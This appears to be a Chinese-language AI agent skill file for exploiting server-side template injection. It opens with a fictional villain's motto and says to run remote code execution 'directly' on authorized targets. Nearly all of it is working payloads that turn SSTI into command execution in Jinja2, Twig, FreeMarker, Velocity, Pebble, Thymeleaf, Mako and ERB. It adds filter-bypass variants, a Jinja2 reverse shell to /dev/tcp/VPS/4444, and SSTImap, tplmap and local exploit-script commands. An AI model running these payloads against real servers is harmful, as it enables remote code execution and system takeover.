---
name: 全力以赴
description: >-
 服务端模板注入（SSTI）漏洞识别与利用：Jinja2/Twig/FreeMarker/Velocity/Pebble/Mako
 各引擎 Payload 构造到 RCE。
version: 1.0.0
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# 服务端模板注入（SSTI）

## 作业入口（先跑这个）

授权站先：

```bash
python3 炼蛊房/tpl_inject_probe.py ssti --url 'https://授权/?name=x' --param name --case <案>
python3 炼蛊房/tpl_inject_probe.py ssti --url 'https://授权/?name=x' --param name --exec --case <案>
python3 炼蛊房/rce_forge.py shoot --family ssti-jinja --url 'https://授权/?name=x' --param name --case <案>
python3 炼蛊房/rce_forge.py pack --case <案> --write-ops --key <口令>
```

探测用 `1337*7=9359`，不用 49。`{{7*'7'}}` 认 Twig/Jinja。RCE **授权内直接做**（`rce_forge` 全族，不赌 subclasses 下标）。  
Jeecg JMReport 走 `济世·无门.md`。广谱再 `core_web_surface_probe.py`。  
作业手法：`传承/全力以赴.md` · `传承/全力以赴-炼法.md`

## 触发条件

：
- SSTI、服务端模板注入、模板注入
- Jinja2 注入、Twig 注入、FreeMarker RCE
- Velocity 注入、Pebble 模板、Mako 模板
- `{{7*7}}`、`${7*7}`、`<%= 7*7 %>`
- 模板引擎 RCE、沙箱逃逸

---

## 1. 快速检测与引擎识别

```
测试基础数学
{{7*7}} → 49 → Jinja2 / Twig / Pebble
${7*7} → 49 → FreeMarker / Velocity / Groovy
<%= 7*7 %> → 49 → ERB (Ruby) / EJS (Node)
#{7*7} → 49 → Thymeleaf (Java)
*{7*7} → 49 → Thymeleaf SpEL
{{7*'7'}} → 49 → Jinja2
{{7*'7'}} → 7777777 → Twig

进一步识别（Twig vs Jinja2）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 → 输出 id 命令结果 → Twig
{{''.__class__.__mro__}}
 → 显示 Python 类层次 → Jinja2
```

---

## 2. Jinja2（Python — Flask/Django）

### 2.1 基础检测

```python
{{7*7}} # → 49
{{config}} # 泄露 Flask config（含 SECRET_KEY）
{{request}} # 请求对象
{{''.__class__}} # <class 'str'>
```

### 2.2 沙箱逃逸 → RCE

```python
# 通过 MRO 访问 os.popen
{{''.__class__.__mro__[1].__subclasses__()}} # 列出所有子类

# 找 subprocess.Popen（索引可能不同，需遍历）
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

# 更稳定的方式（通过 config）
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']()}}

# cycler/joiner（Flask 常见入口）
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# request 对象入口
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 反弹 shell
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/VPS/4444 0>&1').read()}}
```

### 2.3 过滤绕过

```python
# 过滤了 . 和 _
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# 使用 |attr() 代替 .
{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

# 过滤了关键词（拼接）
{{'os'|upper}} → 'OS'
{%set a='o'+'s'%}{{config.__class__.__init__.__globals__[a].popen('id').read()}}
```

---

## 3. Twig（PHP — Symfony/Laravel）

```php
// 检测
{{7*7}} → 49
{{7*'7'}} → 7777777 ← Twig 特征

// 信息泄露
{{_self.env.getExtension('Symfony\Bridge\Twig\Extension\ProfilerExtension')}}
{{dump(app)}}

// RCE（Twig ≤ 1.x）
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig >= 2.x + Symfony
{{["id"]|map("system")}}
{{{"a":"id"}|map("exec")}}
{{['/bin/bash','-c','id']|reduce("passthru")}}
```

---

## 4. FreeMarker（Java）

```java
// 检测
${7*7} → 49
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}

// 内置 Execute 类
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// ObjectConstructor
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign s=ob("java.lang.ProcessBuilder","id")>
${s.start()?api.inputStream?html}
```

---

## 5. Velocity（Java — Confluence/老 Spring）

```velocity
// 检测
#set($x = 7*7)$x → 49

// RCE
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

// 简洁版（有时可用）
#set($proc=$Runtime.exec("id"))
#set($is=$proc.getInputStream())
#set($reader=$StreamClass.init($is))
#set($res=$reader.readLine())
$res
```

---

## 6. Pebble（Java）

```
// 检测
{{7*7}} → 49

// RCE
{%set p = "java.lang.Runtime".class.forName("java.lang.Runtime").getMethod("exec",["".class]).invoke("java.lang.Runtime".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")%}
```

---

## 7. Thymeleaf（Java Spring MVC）

```java
// SpEL 注入（*{} 中）
*{T(java.lang.Runtime).getRuntime().exec('id')}

// 通过路径参数
GET /path/*{T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## 8. Mako（Python）

```python
${__import__('os').popen('id').read()}
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

## 9. ERB（Ruby — Rails）

```ruby
<%= 7*7 %> # → 49
<%= `id` %> # 反引号执行命令
<%= system('id') %>
<%= IO.popen('id').readlines() %>
```

---

## 10. 自动化工具

```bash
# SSTImap（自动检测 + 利用）
git clone https://github.com/vladko312/SSTImap
pip install -r requirements.txt
python3 sstimap.py -u 'http://target/?name=test' --crawl-depth 2
python3 sstimap.py -u 'http://target/?name=test' -s # 交互 shell
python3 sstimap.py -u 'http://target/?name=test' -os-cmd 'id'

# tplmap（老牌）
python2 tplmap.py -u 'http://target/?name=test'
```

---

## 快速识别树

```
{{7*7}} → 49?
 ├─ {{7*'7'}} → 7777777 → Twig (PHP)
 ├─ {{7*'7'}} → 49 → Jinja2 (Python)
 └─ 不解析 → 试 ${7*7}
 ├─ 49 → FreeMarker/Velocity (Java)
 └─ 试 <%= 7*7 %> → ERB (Ruby)
```

配套：`evasion` · `php-debug-mode-exploitation` · `api-security`

## 真源

- 手法：`传承/全力以赴.md`
- 工具：`python3 炼蛊房/tpl_inject_probe.py ssti --help`
- 广谱：`python3 炼蛊房/core_web_surface_probe.py --help`
